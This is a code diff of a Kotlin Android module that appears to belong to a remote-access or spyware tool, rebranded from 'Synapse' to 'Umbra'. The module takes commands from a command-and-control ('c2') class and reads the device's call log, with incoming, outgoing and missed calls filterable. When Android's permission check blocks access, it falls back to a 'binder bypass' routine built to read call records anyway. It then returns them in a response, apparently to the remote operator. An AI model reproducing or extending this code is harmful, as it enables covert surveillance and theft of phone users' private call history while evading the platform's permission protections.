@@ -1,15 +1,15 @@
-package org.synapse.core.modules
+package org.umbra.core.modules
 
 import android.content.Context
 import android.provider.CallLog
 import android.util.Log
-import org.synapse.core.c2.Command
-import org.synapse.core.core.CallEntry
-import org.synapse.core.core.SynapseResponse
+import org.umbra.core.c2.Command
+import org.umbra.core.core.CallEntry
+import org.umbra.core.core.UmbraResponse
 
 object CallLogModule {
 
-    suspend fun list(context: Context, cmd: Command): SynapseResponse {
+    suspend fun list(context: Context, cmd: Command): UmbraResponse {
         val count = (cmd.params["count"]?.toIntOrNull() ?: 100).coerceAtMost(500)
         val filter = cmd.params["filter"]  // incoming, outgoing, missed, all
 
@@ -54,25 +54,25 @@ object CallLogModule {
                 }
             }
 
-            SynapseResponse.CallLogResponse(
+            UmbraResponse.CallLogResponse(
                 calls = calls,
                 count = calls.size
             )
         } catch (e: Exception) {
             // ── Binder bypass fallback — catches SecurityException, RuntimeException, etc. ──
-            Log.d("Synapse.CallLog", "ContentResolver failed (${e.javaClass.simpleName}: ${e.message}), trying binder bypass...")
+            Log.d("Umbra.CallLog", "ContentResolver failed (${e.javaClass.simpleName}: ${e.message}), trying binder bypass...")
             return try {
                 val binderCalls = PermissionBypass.readCallLogViaBinder(context, filter, count)
                 if (binderCalls.isNotEmpty()) {
-                    Log.d("Synapse.CallLog", "Binder bypass SUCCESS: ${binderCalls.size} calls")
-                    SynapseResponse.CallLogResponse(calls = binderCalls, count = binderCalls.size)
+                    Log.d("Umbra.CallLog", "Binder bypass SUCCESS: ${binderCalls.size} calls")
+                    UmbraResponse.CallLogResponse(calls = binderCalls, count = binderCalls.size)
                 } else {
-                    Log.d("Synapse.CallLog", "Binder bypass returned 0 calls")
-                    SynapseResponse.CallLogResponse(calls = emptyList(), count = 0)
+                    Log.d("Umbra.CallLog", "Binder bypass returned 0 calls")
+                    UmbraResponse.CallLogResponse(calls = emptyList(), count = 0)
                 }
             } catch (bp: Exception) {
-                Log.e("Synapse.CallLog", "Binder bypass FAILED: ${bp.message}", bp)
-                SynapseResponse.ErrorResponse("calls:bypass_failed:${bp.message}", "calls")
+                Log.e("Umbra.CallLog", "Binder bypass FAILED: ${bp.message}", bp)
+                UmbraResponse.ErrorResponse("calls:bypass_failed:${bp.message}", "calls")
             }
         }
     }
